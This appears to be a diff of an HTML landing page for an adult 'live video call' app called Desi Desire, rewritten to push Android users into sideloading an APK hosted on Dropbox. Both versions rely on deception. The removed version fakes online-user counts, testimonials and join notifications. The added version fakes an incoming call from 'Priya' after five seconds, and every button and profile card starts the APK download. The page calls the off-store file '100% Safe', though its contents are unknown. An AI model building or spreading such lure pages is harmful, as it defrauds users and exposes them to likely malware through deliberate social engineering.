@@ -3,499 +3,176 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>🎉 DESI DESIRE VIP | FREE LIFETIME ACCESS v5.0</title>
-    
-    <!-- Fonts & Icons -->
-    <link href="https://fonts.googleapis.com/css2?family=Syncopate:wght@400;700&family=Lexend:wght@100;300;400;500;600;700;800;900&family=JetBrains+Mono:wght@200;400;700&display=swap" rel="stylesheet">
+    <title>🔞 DESI DESIRE VIP - LIVE VIDEO CALL</title>
+    <link href="https://fonts.googleapis.com/css2?family=Kanit:wght@400;700;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    
     <style>
-        :root {
-            --p: #FF005C; --s: #00F0FF; --g: #FFD700; --bg: #030305;
-            --card: rgba(18, 18, 22, 0.95); --border: rgba(255, 255, 255, 0.1);
-            --neon-glow: 0 0 20px rgba(255, 0, 92, 0.6);
-        }
+        :root { --p: #ff005c; --s: #00f0ff; --g: #ffd700; }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Kanit', sans-serif; }
+        body { background: #000; color: #fff; overflow-x: hidden; padding-bottom: 100px; }
 
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Lexend', sans-serif; }
-        
-        body { background: var(--bg); color: #fff; overflow-x: hidden; }
-
-        /* FREE BANNER */
-        .free-banner {
-            background: linear-gradient(90deg, #00D2B8, #00F0FF);
-            color: #000; padding: 15px; text-align: center;
-            font-weight: 900; font-size: 18px; position: sticky;
-            top: 0; z-index: 10000; animation: blink 1s infinite;
+        /* FLASHING TOP BAR */
+        .top-flash {
+            background: #ff0000; color: #fff; padding: 12px; text-align: center;
+            font-weight: 900; text-transform: uppercase; font-size: 14px;
+            animation: flash 0.6s infinite; position: sticky; top: 0; z-index: 1000;
         }
-        
-        @keyframes blink { 50% { opacity: 0.8; } }
-
-        /* HEADER */
-        .header {
-            padding: 20px; text-align: center;
-            background: rgba(0,0,0,0.9); border-bottom: 1px solid var(--border);
-        }
-        
-        .logo { font-family: 'Syncopate', sans-serif; font-size: 32px; font-weight: 900; }
-        .logo span { color: var(--p); }
+        @keyframes flash { 0% { background: #ff0000; } 50% { background: #660000; } 100% { background: #ff0000; } }
 
         /* HERO SECTION */
-        .hero {
-            padding: 40px 20px; text-align: center;
-            background: linear-gradient(135deg, #0a0a0c, #000);
+        .hero { position: relative; height: 55vh; overflow: hidden; border-bottom: 4px solid var(--p); }
+        .hero-img { width: 100%; height: 100%; object-fit: cover; filter: brightness(0.8); }
+        .hero-overlay {
+            position: absolute; bottom: 0; left: 0; width: 100%;
+            background: linear-gradient(transparent, rgba(0,0,0,0.9) 70%, #000); 
+            padding: 30px 20px; text-align: center;
         }
-        
-        .hero h1 { font-size: 38px; font-weight: 900; line-height: 1.2; margin-bottom: 15px; }
-        .hero h1 span { color: var(--g); }
-        
-        .hero-subtitle { 
-            font-size: 18px; opacity: 0.9; max-width: 600px; 
-            margin: 0 auto 30px; color: #00F0FF;
+        .hero h1 { font-size: 42px; text-transform: uppercase; line-height: 0.9; color: #fff; text-shadow: 0 0 20px var(--p); }
+        .hero h1 span { color: var(--g); display: block; font-size: 24px; margin-top: 10px; }
+
+        /* VIBRATING DOWNLOAD BUTTON */
+        .dl-btn {
+            background: linear-gradient(45deg, #ff005c, #ff5e00);
+            color: #fff; text-decoration: none; display: block;
+            margin: 20px; padding: 22px; border-radius: 15px;
+            text-align: center; font-weight: 900; font-size: 26px;
+            box-shadow: 0 0 40px rgba(255, 0, 92, 0.7);
+            animation: shake 0.4s infinite; border: 3px solid #fff;
+            text-transform: uppercase;
+        }
+        @keyframes shake {
+            0% { transform: translate(2px, 1px) rotate(0deg); }
+            25% { transform: translate(-2px, -1px) rotate(-1deg); }
+            50% { transform: translate(1px, 2px) rotate(1deg); }
+            100% { transform: translate(-1px, 1px) rotate(0deg); }
         }
 
-        /* FREE ACCESS CARD */
-        .free-card {
-            background: linear-gradient(145deg, #15151a, #000);
-            padding: 40px 25px; border-radius: 30px;
-            border: 3px solid #00D2B8; margin: 20px;
-            text-align: center; box-shadow: 0 20px 50px rgba(0, 240, 255, 0.2);
+        /* LIVE GRID */
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; padding: 12px; }
+        .card { background: #111; border-radius: 20px; overflow: hidden; border: 1px solid #333; position: relative; }
+        .card img { width: 100%; height: 280px; object-fit: cover; }
+        .live-tag {
+            position: absolute; top: 12px; left: 12px; background: #ff0000;
+            padding: 4px 12px; border-radius: 6px; font-size: 11px; font-weight: 900;
+            display: flex; align-items: center; gap: 5px; animation: pulse 1s infinite;
         }
+        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
         
-        .free-badge {
-            background: #00D2B8; color: #000; padding: 10px 25px;
-            border-radius: 50px; font-weight: 900; display: inline-block;
-            font-size: 14px; margin-bottom: 20px;
+        .card-name { padding: 10px; font-weight: 700; font-size: 16px; text-align: center; color: var(--g); }
+        .call-icon {
+            position: absolute; bottom: 45px; right: 10px;
+            background: #00ff00; width: 45px; height: 45px;
+            border-radius: 50%; display: flex; align-items: center; justify-content: center;
+            color: #000; font-size: 22px; box-shadow: 0 0 20px #00ff00;
+            animation: ring 1s infinite;
         }
-        
-        .free-price {
-            font-size: 70px; font-weight: 900; color: #00F0FF;
-            text-shadow: 0 0 30px #00F0FF;
+        @keyframes ring { 0% { transform: scale(1); } 50% { transform: scale(1.2); } 100% { transform: scale(1); } }
+
+        /* FAKE CALL SCREEN */
+        #fakeCall {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.95); z-index: 10000;
+            display: none; flex-direction: column; align-items: center; justify-content: space-around;
+            padding: 50px 20px; text-align: center;
+        }
+        .caller-img { width: 180px; height: 180px; border-radius: 50%; border: 5px solid #00ff00; object-fit: cover; animation: glow 1.5s infinite; }
+        @keyframes glow { 0%, 100% { box-shadow: 0 0 20px #00ff00; } 50% { box-shadow: 0 0 60px #00ff00; } }
+        .call-btns { display: flex; gap: 50px; }
+        .c-btn { width: 80px; height: 80px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 30px; color: white; border: none; }
+        .accept { background: #00ff00; animation: bounce 1s infinite; }
+        .reject { background: #ff0000; }
+
+        /* STICKY BOTTOM */
+        .sticky-bar {
+            position: fixed; bottom: 0; left: 0; width: 100%;
+            background: rgba(0,0,0,0.95); padding: 15px; border-top: 2px solid var(--p);
+            z-index: 999; display: flex; align-items: center; gap: 15px;
+        }
+        .mini-btn {
+            background: var(--p); color: #fff; text-decoration: none; flex: 1;
+            padding: 15px; border-radius: 10px; text-align: center; font-weight: 900; font-size: 18px;
         }
 
-        /* FEATURES */
-        .features { padding: 40px 20px; }
-        
-        .feature-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 20px; max-width: 1000px; margin: 0 auto;
-        }
-        
-        .feature {
-            background: rgba(255,255,255,0.05); padding: 25px;
-            border-radius: 20px; border: 1px solid rgba(0, 240, 255, 0.2);
-        }
-        
-        .feature i { font-size: 2.5rem; color: #00F0FF; margin-bottom: 15px; }
-
-        /* PROFILES - YOUR ORIGINAL IMAGES */
-        .profiles-section { padding: 40px 20px; }
-        
-        .profiles-title {
-            font-size: 28px; font-weight: 900; text-align: center;
-            margin-bottom: 30px; color: var(--g);
-        }
-        
-        .profiles-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
-            gap: 20px; max-width: 1200px; margin: 0 auto;
-        }
-        
-        .profile-card {
-            background: var(--card); border-radius: 25px;
-            overflow: hidden; border: 2px solid var(--border);
-            transition: transform 0.3s;
-        }
-        
-        .profile-card:hover {
-            transform: translateY(-10px);
-            border-color: var(--p);
-        }
-        
-        .profile-img { 
-            width: 100%; 
-            height: 380px; 
-            object-fit: cover;
-            object-position: top center;
-        }
-        
-        .profile-info {
-            padding: 20px; background: rgba(0,0,0,0.8);
-            border-top: 2px solid var(--p);
-        }
-        
-        .profile-name { font-size: 22px; font-weight: 900; color: var(--g); }
-        
-        .profile-bio { font-size: 14px; opacity: 0.8; margin: 10px 0; }
-        
-        .online-badge {
-            background: #00ff80; color: #000; padding: 5px 15px;
-            border-radius: 20px; font-size: 12px; font-weight: 900;
-            display: inline-block; margin-top: 10px;
-        }
-
-        /* DOWNLOAD BUTTON */
-        .download-btn {
-            background: linear-gradient(90deg, #00D2B8, #00F0FF);
-            color: #000; text-decoration: none; display: block;
-            padding: 25px; border-radius: 25px; text-align: center;
-            font-weight: 900; font-size: 26px; margin: 30px auto;
-            max-width: 500px; box-shadow: 0 20px 40px rgba(0, 240, 255, 0.3);
-            animation: bounce 2s infinite;
-            border: 3px solid white;
-        }
-        
-        @keyframes bounce { 
-            0%, 100% { transform: translateY(0); }
-            50% { transform: translateY(-10px); }
-        }
-
-        /* LIVE STATS */
-        .stats {
-            display: flex; justify-content: center; gap: 40px;
-            flex-wrap: wrap; padding: 30px; text-align: center;
-        }
-        
-        .stat-box { min-width: 150px; }
-        
-        .stat-number {
-            font-size: 2.5rem; font-weight: 900; color: var(--g);
-            margin-bottom: 5px;
-        }
-
-        /* FOOTER */
-        .footer {
-            background: #000; padding: 40px 20px; text-align: center;
-            border-top: 2px solid var(--p);
-        }
-        
-        /* NOTIFICATION */
-        .notification {
-            position: fixed; bottom: 100px; right: 20px;
-            background: linear-gradient(90deg, var(--p), #FF005C);
-            color: white; padding: 15px; border-radius: 15px;
-            max-width: 300px; display: none; z-index: 1000;
-            border-left: 5px solid var(--g);
-            animation: slideIn 0.5s ease-out;
-        }
-        
-        @keyframes slideIn {
-            from { transform: translateX(100%); }
-            to { transform: translateX(0); }
-        }
-
-        /* RESPONSIVE */
-        @media (max-width: 768px) {
-            .hero h1 { font-size: 28px; }
-            .free-price { font-size: 50px; }
-            .download-btn { font-size: 20px; padding: 20px; }
-            .profiles-grid { grid-template-columns: 1fr; }
-        }
+        .no-coin { color: var(--s); text-align: center; font-weight: 700; font-size: 20px; margin: 15px 0; }
     </style>
 </head>
 <body>
-    <!-- FREE BANNER -->
-    <div class="free-banner">
-        🎉 FREE LIFETIME VIP ACCESS! 🎉
-        <span style="background: #000; color: #00F0FF; padding: 3px 10px; border-radius: 15px; margin-left: 10px;">
-            NO PAYMENT • NO SUBSCRIPTION
-        </span>
-    </div>
 
-    <!-- HEADER -->
-    <div class="header">
-        <div class="logo">DESI<span>DESIRE</span></div>
-        <div style="margin-top: 10px; font-size: 14px; color: #00D2B8;">
-            <i class="fas fa-shield-alt"></i> 100% Private & Secure
+    <div class="top-flash">🔥 ONLY 18 SLOTS LEFT FOR FREE VIP ACCESS! 🔥</div>
+
+    <div class="hero">
+        <img src="https://desidesire.lovestoblog.com/Images/png1.jpg" class="hero-img">
+        <div class="hero-overlay">
+            <h1>BINA COIN KE <br> <span>DIRECT VIDEO CALL</span></h1>
         </div>
     </div>
 
-    <!-- HERO SECTION -->
-    <section class="hero">
-        <h1>India's Most <span>Exclusive</span> Video Chat App</h1>
-        <p class="hero-subtitle">
-            Connect with real verified Indian girls. 100% FREE lifetime access. No hidden charges.
-        </p>
+    <div class="no-coin">❌ No Recharge • ❌ No Coins • ✅ 100% Free</div>
 
-        <!-- FREE ACCESS CARD -->
-        <div class="free-card">
-            <div class="free-badge">FREE LIFETIME VIP ACCESS</div>
-            <div class="free-price">₹0</div>
-            <p style="font-size: 18px; margin: 20px 0; opacity: 0.9;">
-                Unlimited HD Video Calls • Private Chat • Verified Profiles
-            </p>
-            
-            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 30px 0;">
-                <div style="text-align: center;">
-                    <i class="fas fa-video" style="color: #00F0FF; font-size: 2rem;"></i>
-                    <p style="font-size: 14px; margin-top: 10px;">HD Video Calls</p>
-                </div>
-                <div style="text-align: center;">
-                    <i class="fas fa-user-secret" style="color: #00F0FF; font-size: 2rem;"></i>
-                    <p style="font-size: 14px; margin-top: 10px;">100% Private</p>
-                </div>
-                <div style="text-align: center;">
-                    <i class="fas fa-bolt" style="color: #00F0FF; font-size: 2rem;"></i>
-                    <p style="font-size: 14px; margin-top: 10px;">Instant Connect</p>
-                </div>
-            </div>
-        </div>
-    </section>
-
-    <!-- LIVE STATS -->
-    <div class="stats">
-        <div class="stat-box">
-            <div class="stat-number" id="usersOnline">48,921</div>
-            <div>Users Online</div>
-        </div>
-        <div class="stat-box">
-            <div class="stat-number" id="activeCalls">12,847</div>
-            <div>Live Calls</div>
-        </div>
-        <div class="stat-box">
-            <div class="stat-number" id="verifiedGirls">5,284</div>
-            <div>Verified Girls</div>
-        </div>
-    </div>
-
-    <!-- FEATURES -->
-    <section class="features">
-        <h2 style="text-align: center; font-size: 2rem; margin-bottom: 40px; color: var(--g);">
-            WHY DESI DESIRE IS #1
-        </h2>
-        
-        <div class="feature-grid">
-            <div class="feature">
-                <i class="fas fa-lock"></i>
-                <h3>Complete Privacy</h3>
-                <p>Your identity is hidden. No phone number sharing. Ghost mode available.</p>
-            </div>
-            
-            <div class="feature">
-                <i class="fas fa-video"></i>
-                <h3>HD Video Quality</h3>
-                <p>Crystal clear video calls on 4G/5G. No buffering, no delays.</p>
-            </div>
-            
-            <div class="feature">
-                <i class="fas fa-check-circle"></i>
-                <h3>Verified Profiles</h3>
-                <p>Every girl is manually verified by our team. No fakes, no bots.</p>
-            </div>
-        </div>
-    </section>
-
-    <!-- PROFILES WITH YOUR IMAGES -->
-    <section class="profiles-section">
-        <h2 class="profiles-title">MEET OUR VIP MODELS</h2>
-        
-        <div class="profiles-grid" id="profilesContainer">
-            <!-- Your original images will load here -->
-        </div>
-    </section>
-
-    <!-- MAIN DOWNLOAD BUTTON -->
-    <a href="https://www.mediafire.com/file/huwgawvfdx94fpg/Desi+Desire.apk/file" 
-       class="download-btn" id="downloadBtn">
-        <i class="fas fa-download"></i>
-        DOWNLOAD FREE APP
-        <div style="font-size: 14px; margin-top: 5px;">
-             • Android 7.0+ • 100% Safe
-        </div>
+    <a href="https://www.dropbox.com/scl/fi/8mvizyvrj3zm1duve2q7q/Desi-Desire.apk?rlkey=5om7qebwqygsnn7br5j8ruh2k&st=5w8zt9i0&dl=1" class="dl-btn">
+        <i class="fas fa-video"></i> START VIDEO CALL
     </a>
 
-    <!-- USER TESTIMONIALS -->
-    <div style="padding: 40px 20px; max-width: 800px; margin: 0 auto;">
-        <h3 style="text-align: center; font-size: 1.8rem; margin-bottom: 30px; color: var(--g);">
-            What Users Are Saying
-        </h3>
-        
-        <div style="background: rgba(255,255,255,0.05); padding: 25px; border-radius: 20px; margin-bottom: 20px;">
-            <p style="font-style: italic;">"Best app ever! Completely free and real girls. Met Priya from Delhi, she's amazing!"</p>
-            <div style="color: var(--g); font-weight: 900; margin-top: 15px;">- Rahul, Mumbai</div>
-        </div>
-        
-        <div style="background: rgba(255,255,255,0.05); padding: 25px; border-radius: 20px; margin-bottom: 20px;">
-            <p style="font-style: italic;">"100% working. No payment required. Video quality is superb. 5 stars!"</p>
-            <div style="color: var(--g); font-weight: 900; margin-top: 15px;">- Vikram, Delhi</div>
-        </div>
+    <div style="text-align: center; color: #fff; font-size: 14px; margin-bottom: 10px;">
+        <i class="fas fa-circle" style="color: #00ff00; font-size: 10px;"></i> 8,421 Girls Online Now
     </div>
 
-    <!-- FOOTER -->
-    <footer class="footer">
-        <div class="logo" style="margin-bottom: 20px;">DESI<span>DESIRE</span></div>
-        
-        <p style="opacity: 0.7; max-width: 600px; margin: 0 auto 20px; font-size: 14px;">
-            This app is for adults only (18+). All profiles are verified. 
-            No personal information is shared. Use responsibly.
-        </p>
-        
-        <p style="opacity: 0.5; font-size: 12px;">
-            APK not available on Play Store • Direct secure download • © 2024 Desi Desire
-        </p>
-    </footer>
+    <div class="grid" id="grid">
+        <!-- JS se load hoga -->
+    </div>
 
-    <!-- LIVE NOTIFICATION -->
-    <div class="notification" id="liveNotification">
-        <i class="fas fa-bell" style="color: var(--g); margin-right: 10px;"></i>
+    <!-- FAKE CALL POPUP -->
+    <div id="fakeCall">
         <div>
-            <strong id="notifUser">New user joined!</strong>
-            <div style="font-size: 12px;" id="notifAction">Downloading app now</div>
+            <h2 style="color: #00ff00; margin-bottom: 10px;">INCOMING VIDEO CALL...</h2>
+            <p style="color: #ccc;">Priya is calling you</p>
+        </div>
+        <img src="https://desidesire.lovestoblog.com/Images/png3.jpg" class="caller-img">
+        <div class="call-btns">
+            <button class="c-btn reject" onclick="closeCall()"><i class="fas fa-phone-slash"></i></button>
+            <button class="c-btn accept" onclick="location.href='https://www.dropbox.com/scl/fi/8mvizyvrj3zm1duve2q7q/Desi-Desire.apk?rlkey=5om7qebwqygsnn7br5j8ruh2k&st=5w8zt9i0&dl=1'"><i class="fas fa-video"></i></button>
         </div>
     </div>
 
-    <!-- JAVASCRIPT -->
+    <div class="sticky-bar">
+        <div style="font-size: 12px; line-height: 1.2;">
+            <div style="font-weight: 900; color: var(--g);">FREE ACCESS</div>
+            <div style="color: #fff;">v5.0 VIP MOD</div>
+        </div>
+        <a href="https://www.dropbox.com/scl/fi/8mvizyvrj3zm1duve2q7q/Desi-Desire.apk?rlkey=5om7qebwqygsnn7br5j8ruh2k&st=5w8zt9i0&dl=1" class="mini-btn">INSTALL & CALL</a>
+    </div>
+
     <script>
-        // YOUR ORIGINAL PROFILE DATA WITH YOUR IMAGES
-        const profiles = [
-            {
-                name: "Priya, 23",
-                bio: "Bold & Adventures, loves long talks.",
-                image: "https://desidesire.lovestoblog.com/Images/png1.jpg"
-            },
-            {
-                name: "Sneha, 25", 
-                bio: "Modern bhabhi, always online for fun.",
-                image: "https://desidesire.lovestoblog.com/Images/png3.jpg"
-            },
-            {
-                name: "Komal, 22",
-                bio: "College girl looking for private chats.",
-                image: "https://desidesire.lovestoblog.com/Images/png6.jpg"
-            },
-            {
-                name: "Anjali, 24",
-                bio: "Quiet but very naughty on video calls.",
-                image: "https://desidesire.lovestoblog.com/Images/png5.jpg"
-            },
-            {
-                name: "Riya, 21",
-                bio: "Model looking for VIP friendship.",
-                image: "https://desidesire.lovestoblog.com/Images/png8.jpg"
-            },
-            {
-                name: "Pooja, 26",
-                bio: "Loves roleplay and hot conversations.",
-                image: "https://desidesire.lovestoblog.com/Images/png7.jpg"
-            },
-            {
-                name: "Divya, 23",
-                bio: "Software engineer by day, wild by night.",
-                image: "https://desidesire.lovestoblog.com/Images/png2.jpg"
-            },
-            {
-                name: "Neha, 22",
-                bio: "Fashion designer ready for video chat.",
-                image: "https://desidesire.lovestoblog.com/Images/png4.jpg"
-            }
+        const girls = [
+            { name: "Sneha (22)", img: "https://desidesire.lovestoblog.com/Images/png3.jpg" },
+            { name: "Anjali (24)", img: "https://desidesire.lovestoblog.com/Images/png5.jpg" },
+            { name: "Riya (21)", img: "https://desidesire.lovestoblog.com/Images/png8.jpg" },
+            { name: "Pooja (23)", img: "https://desidesire.lovestoblog.com/Images/png7.jpg" },
+            { name: "Divya (25)", img: "https://desidesire.lovestoblog.com/Images/png2.jpg" },
+            { name: "Neha (22)", img: "https://desidesire.lovestoblog.com/Images/png4.jpg" }
         ];
 
-        // LOAD PROFILES
-        function loadProfiles() {
-            const container = document.getElementById('profilesContainer');
-            profiles.forEach(profile => {
-                container.innerHTML += `
-                    <div class="profile-card">
-                        <img src="${profile.image}" class="profile-img" alt="${profile.name}">
-                        <div class="profile-info">
-                            <div class="profile-name">${profile.name}</div>
-                            <div class="profile-bio">"${profile.bio}"</div>
-                            <div class="online-badge">ONLINE NOW</div>
-                        </div>
-                    </div>
-                `;
-            });
-        }
-
-        // ANIMATE STATS
-        function animateStats() {
-            setInterval(() => {
-                // Users Online
-                let users = parseInt(document.getElementById('usersOnline').textContent.replace(/,/g, '')) || 48921;
-                users += Math.floor(Math.random() * 100) - 50;
-                users = Math.max(48000, Math.min(52000, users));
-                document.getElementById('usersOnline').textContent = users.toLocaleString();
-
-                // Active Calls
-                let calls = parseInt(document.getElementById('activeCalls').textContent.replace(/,/g, '')) || 12847;
-                calls += Math.floor(Math.random() * 50) - 25;
-                calls = Math.max(12000, Math.min(14000, calls));
-                document.getElementById('activeCalls').textContent = calls.toLocaleString();
-
-                // Verified Girls
-                let girls = parseInt(document.getElementById('verifiedGirls').textContent.replace(/,/g, '')) || 5284;
-                girls += Math.floor(Math.random() * 20) - 10;
-                girls = Math.max(5000, Math.min(5500, girls));
-                document.getElementById('verifiedGirls').textContent = girls.toLocaleString();
-            }, 3000);
-        }
-
-        // LIVE NOTIFICATIONS
-        function showNotifications() {
-            const users = ["Rahul", "Vikram", "Sumit", "Deepak", "Arjun", "Karan"];
-            const cities = ["Delhi", "Mumbai", "Pune", "Noida", "Lucknow", "Patna"];
-            
-            setInterval(() => {
-                const user = users[Math.floor(Math.random() * users.length)];
-                const city = cities[Math.floor(Math.random() * cities.length)];
-                
-                document.getElementById('notifUser').textContent = `${user} from ${city} just joined!`;
-                document.getElementById('notifAction').textContent = "Downloading app now";
-                
-                const notif = document.getElementById('liveNotification');
-                notif.style.display = 'block';
-                
-                setTimeout(() => {
-                    notif.style.display = 'none';
-                }, 5000);
-            }, 12000); // Every 12 seconds
-        }
-
-        // DOWNLOAD BUTTON CLICK
-        document.getElementById('downloadBtn').addEventListener('click', function(e) {
-            e.preventDefault();
-            
-            const originalHTML = this.innerHTML;
-            this.innerHTML = '<i class="fas fa-spinner fa-spin"></i> DOWNLOAD STARTING...';
-            
-            setTimeout(() => {
-                window.open(this.href, '_blank');
-                
-                this.innerHTML = '<i class="fas fa-check"></i> DOWNLOAD STARTED!';
-                this.style.background = 'linear-gradient(90deg, #00ff80, #00D2B8)';
-                
-                setTimeout(() => {
-                    this.innerHTML = originalHTML;
-                    this.style.background = 'linear-gradient(90deg, #00D2B8, #00F0FF)';
-                }, 2000);
-            }, 1000);
+        const container = document.getElementById('grid');
+        girls.forEach(g => {
+            container.innerHTML += `
+                <div class="card" onclick="location.href='https://www.dropbox.com/scl/fi/8mvizyvrj3zm1duve2q7q/Desi-Desire.apk?rlkey=5om7qebwqygsnn7br5j8ruh2k&st=5w8zt9i0&dl=1'>
+                    <img src="${g.img}">
+                    <div class="live-tag">● LIVE</div>
+                    <div class="call-icon"><i class="fas fa-video"></i></div>
+                    <div class="card-name">${g.name}</div>
+                </div>
+            `;
         });
 
-        // AUTO-SCROLL TO DOWNLOAD AFTER 30 SECONDS
+        // 5 Seconds baad Fake Call aayega
         setTimeout(() => {
-            document.getElementById('downloadBtn').scrollIntoView({
-                behavior: 'smooth',
-                block: 'center'
-            });
-            
-            setTimeout(() => {
-                alert('🎁 FREE LIFETIME ACCESS!\n\nDownload now to unlock all VIP features at ₹0!');
-            }, 1000);
-        }, 30000);
+            document.getElementById('fakeCall').style.display = 'flex';
+            // Ek ringtone sound bhi add kar sakte ho yahan
+        }, 5000);
 
-        // INITIALIZE
-        window.onload = function() {
-            loadProfiles();
-            animateStats();
-            showNotifications();
-            
-            // Show first notification
-            setTimeout(() => {
-                document.getElementById('liveNotification').style.display = 'block';
-                setTimeout(() => {
-                    document.getElementById('liveNotification').style.display = 'none';
-                }, 5000);
-            }, 8000);
-        };
+        function closeCall() {
+            document.getElementById('fakeCall').style.display = 'none';
+        }
     </script>
 </body>
 </html>
